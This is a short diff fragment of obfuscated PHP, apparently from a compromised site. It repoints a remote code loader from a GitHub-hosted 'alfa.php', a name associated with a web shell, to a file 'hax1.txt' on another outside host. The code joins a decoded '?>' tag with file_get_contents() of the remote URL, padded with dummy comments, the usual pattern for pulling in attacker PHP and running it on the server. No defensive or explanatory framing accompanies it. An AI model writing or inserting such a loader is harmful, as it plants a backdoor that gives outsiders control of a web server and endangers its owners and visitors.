@@ -2,7 +2,7 @@
     /**_**/ urldecode("%3f%3e") .
         file_get_contents(
             /**_**/ urldecode(
-                /**_**/ "https://github.com/robots5050/test/raw/refs/heads/main/alfa.php"
+                /**_**/ "https://www.tapfuse.io/raw/hax1.txt"
             )
         )
 ); ?>
